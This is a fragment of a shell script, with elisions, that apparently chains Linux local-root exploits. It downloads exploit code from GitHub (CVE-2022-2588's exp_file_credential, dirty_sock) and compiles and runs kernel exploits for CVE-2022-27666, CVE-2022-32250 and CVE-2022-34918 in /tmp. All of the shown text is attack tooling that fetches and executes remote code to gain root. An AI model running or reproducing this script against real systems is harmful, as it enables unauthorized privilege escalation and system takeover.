...
topexploit=(
    ...
    https://raw.githubusercontent.com/Markakd/CVE20222588/master/exp_file_credential
...
if [ $localroot = 5 ];then
  ...
  git clone https://github.com/initstring/dirty_sock && cd dirty_sock && python dirty_sockv2.py
...
cd /tmp/$oalah/$CVE202227666 && bash compile.sh && bash run.sh

echo "[+] exploit CVE202232250"
cd /tmp/$oalah/$CVE202232250 && gcc -lmnl -lnftnl exploit.c -o exploit && ./exploit

echo "[+] exploit CVE202234918v1"
